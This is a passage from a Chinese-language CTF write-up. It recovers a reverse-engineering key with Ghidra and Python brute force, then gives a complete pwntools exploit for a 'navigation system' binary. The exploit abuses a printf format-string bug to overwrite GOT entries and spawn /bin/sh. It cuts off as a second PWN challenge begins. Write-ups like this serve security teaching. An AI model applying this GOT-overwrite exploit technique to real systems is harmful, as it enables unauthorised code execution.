不过还是拿出了qemu+IDA+Ghidra的组合拳开始一路调试和理解
利用Ghidra反编译成伪源码查看，在0x10001ef0(enter_key)中发现 **3处动态调用** ，调用后的结果直接影响最后输出是Key is
valid还是程序自爆。
    undefined4 enter_key(void)
    {
      code **ppcVar1;
      int iVar2;
      code *pcVar3;
      undefined4 uVar4;
      undefined auStack124 [24];
      undefined auStack100 [24];
      undefined auStack76 [24];
      undefined auStack52 [36];
      FUN_1002aca0(auStack52);
      print(&DAT_101e1c9c,"[?] Enter the key: ");
      getinput(&DAT_101e1af4,auStack52);
      ppcVar1 = (code **)FUN_10007420(0x10);
      FUN_10000f18(ppcVar1,0x539);
      pcVar3 = *(code **)*ppcVar1;
      iVar2 = (*pcVar3)(ppcVar1,auStack76); /* 第一次动态调用 */
      FUN_1002ae80(auStack76);
      if (iVar2 != 0) {
         ppcVar1 = (code **)FUN_10007420(0x1c);
         FUN_1000137c(ppcVar1,0x53a);
         pcVar3 = *(code **)*ppcVar1;
         FUN_1002f710(auStack100,auStack52);
         iVar2 = (*pcVar3)(ppcVar1,auStack100); /* 第二次动态调用 */
         FUN_1002ae80(auStack100);
        if (iVar2 != 0) {
           ppcVar1 = (code **)FUN_10007420(0x28);
           FUN_10001720(ppcVar1,0x53b);
           pcVar3 = *(code **)*ppcVar1; 
           FUN_1002f710(auStack124,auStack52);
           iVar2 = (*pcVar3)(ppcVar1,auStack124); /* 第三次动态调用 */
           FUN_1002ae80(auStack124);
          if (iVar2 != 0) {
            uVar4 = 1; /* 要求返回1 */
            goto LAB_100020a4;
          }
        }
      }
      uVar4 = 0;
    LAB_100020a4:
      FUN_1002ae80(auStack52);
      return uVar4;
    }
根据动态调试，这3处动态调用如下，逐一分析调用
  * 10001028 命名为 dynamic_func
  * 100014b4 命名为 dynamic_func2
  * 10001ac8 命名为 dynamic_func3
**第一次动态调用（dynamic_func）**
取出0、4、8、12（每间隔4位）的输入，与目标值进行运算比较，都是单个字符进行运算
提取目标值，并且用python进行运算
    result = [ord('*')]*len(arr)
    result[0] = arr[0] - 0x28
    result[4] = (((arr[4] - 0x17 ^ 0x11) + 9)>>1 ^ 0x4f)-0x19
    result[8] = arr[8]/2 - 6
    result[12] = (arr[12] + 0x14)
    result[16] = arr[16] ^ 0x4f
    result[20] = (arr[20] >> 2)*2 + 3
    result[24] = (arr[24] - 0x14 )/3
    result[28] = (arr[28] - 0xe ) ^ 0x58
    print "result","".join([chr(k&0xff) for k in result])
得出
    result 0***7***e***c***b***c***8***5***
**第二次动态调用（dynamic_func2）**
调用了4次，但是每次是将8个字符（如0-7,8-15等）传入函数calcSum算出一个值，与目标常量进行比较
可以想到目前对于输入已知位数太少，这里传入8位必然有很多多解（爆破空间也太大），所以先跳过这里，等对输入位知道更多以后再回来看。
**第三次动态调用（dynamic_func3）**
跳过第二次调用，进入dynamic_func3来看。在Ghidra中，看到恢复的源码很复杂，到底哪个数与哪个数异或，右移？
但是动态调试就很清晰
  * 对于函数10002724，R3、R4、R5是输入，R3是取奇数位输入（input[1]、input[3]、input[5]等等）；R4是每4轮变一次的常量，一开始是0x201b，然后是0x201c；R5是固定值0x3966d59。
  * 对于函数100027f4，则是与计算与输入无关的常量
  * 程序比较两者结果的值
动态提取这些常量，进行正向爆破
    arr = [i.split(" ") for i in """
    0x201b 0x01148455
    0x201b 0x0287099D
    0x201b 0x021CE200
    0x201b 0x01148455
    0x201c 0x01D199F2
    0x201c 0x02F159E9
    0x201c 0x00F1EFDA
    0x201c 0x01714D3C
    0x2019 0x026A8FFF
    0x2019 0x01BC8A83
    0x2019 0x00D0991B
    0x2019 0x005FD57A
    0x201a 0x011F7280
    0x201a 0x00099D6F
    0x201a 0x008629E4
    0x201a 0x012F42EB
    """.split("n") if i!='']
    for i in range(len(arr)):
        ix = 2*i + 1
        target = int(arr[i][1],16)
        param2 = int(arr[i][0],16)
        for j in range(32,128):
            t = FUN_10002724(j,param2,0x3966d59)
            if t == target:
                result[ix] = j
                break
        print "result","".join([chr(k&0xff) for k in result])
计算后结果为
    result 0e*c7d*ee8*ec3*7ba*ec1*489*b57*6
现在只剩个别位字符未知了，可以回去爆破第二次动态调用（dynamic_func2）
    target2 = [int(i,16) for i in """
    0xB76D
    0x5650
    0x7F17
    0xF06E
    """.split("n") if i!='']
    for i in range(4):
        s = result[i*8:i*8+8]
        for x in "1234567890abcdef":
            for y in "1234567890abcdef":
                s[2] = ord(x)
                s[6] = ord(y)
                t = calcSum(s+[0],8)
                if t == target2[i]:
                    result[i*8+2] = s[2]
                    result[i*8+6] = s[6]
                    print "result","".join([chr(k&0xff) for k in result])
得到
    result 0e1c7d9ee8eec3e7bafec18489eb5766
## PWN
###  navigation system
输入用户名和密码，经过getOTPcode函数生成随机码
    unsigned int __cdecl genOTPcode(char *a1, char *a2)
    {
      time_t v2; // eax
      unsigned int v3; // eax
      v2 = time(0);
      srand(*a2 + *a1 + v2);
      v3 = rand();
      return v3 + (v3 >= 0xFFFFFFFF);
    }
在setStation函数中有printf格式化字符串漏洞
    unsigned int setStation()
    {
      char buf[32]; // [esp+Ch] [ebp-2Ch]
      unsigned int v2; // [esp+2Ch] [ebp-Ch]
      v2 = __readgsdword(0x14u);
      printf("Set station > ");
      fflush(stdout);
      buf[read(0, buf, 0x20u)] = 0;                 // off by one
      printf("Station: ");
      printf(buf);                                  // printf 漏洞
      putchar(10);
      return __readgsdword(0x14u) ^ v2;
    }
解题思路
  * 指定种子的随机数生成
  * printf格式化字符串漏洞，长度限制时逐字节修改
  * 修改exit[@got](https://github.com/got "@got")为main获得再次输入
  * 修改strcmp[@got](https://github.com/got "@got")为system[@plt](https://github.com/plt "@plt")
解题脚本
    #!/usr/bin/env python2
    # -*- coding:utf8 -*-    
    import struct
    from pwn import *
    from pwnlib.util.proc import wait_for_debugger
    local = len(sys.argv) == 2
    elf = ELF(sys.argv[1])
    if local:
        io = process(sys.argv[1])
        libc = ELF("/lib/i386-linux-gnu/libc.so.6") #32bit
    def set_station(content):
        io.sendlineafter("> ","2")
        io.sendlineafter("Set station > ",content)
    NAME = "test_account"
    PASS = "test_password"
    io.sendlineafter("Login: ",NAME) 
    io.sendlineafter("Password: ",PASS) 
    seedproc = process(argv=["./test",NAME,PASS])
    content = seedproc.recvall()
    arr = [int(i) for i in content.split("n") if i!='']
    io.sendlineafter("code: ",str(arr[0])) 
    # printf update exit@got->main
    # read(0,0x20...) not enough length
    def fmt_change(got_addr,target):
        ts = p32(target)
        for i in range(4):
            num = "%"+str(ord(ts[i]))+"c" if ord(ts[i]) > 0 else ""
            payload = (num + "%10$hhn").ljust(12,'a') + p32(got_addr+i)
            set_station(payload)
    #change exit@got -> main
    exit_got = elf.got["exit"]
    main_addr = elf.symbols["main"]
    fmt_change(exit_got,main_addr)
    #change strcmp@got -> system@plt
    strcmp_got = elf.got["strcmp"]
    system_plt = elf.plt["system"]
    fmt_change(strcmp_got,system_plt)
    #trigger exit
    io.sendlineafter("> ","4")
    io.sendlineafter("Login: ","/bin/sh") 
    io.sendlineafter("Password: ","aa") 
    io.interactive()
###  engine script
输入一段code，可以进行栈操作，没有进行边界检查所以可以任意地址读写
    void __cdecl proceedOpertaion(char a1)
    {
      fflush(stdout);
      fflush(stdin);
      switch ( a1 )
      {
        case 'a':
          ++*stack_ptr;
          break;